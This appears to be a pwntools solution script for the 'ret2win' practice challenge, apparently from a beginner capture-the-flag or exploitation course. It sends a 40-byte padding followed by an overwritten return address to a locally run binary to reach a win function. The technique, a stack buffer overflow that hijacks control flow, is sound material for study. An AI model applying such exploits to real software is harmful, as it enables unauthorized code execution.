from pwn import *

#pwn = 0x400756
pwn = 0x400764

offset = 32
padding = 8

p = process("./ret2win")

payload = \
[
	b"A"*(offset + padding),
	p64(pwn)
]

print(p.recvuntil("> "))

p.sendline(b"".join(payload))

print(p.recvall(timeout=1))

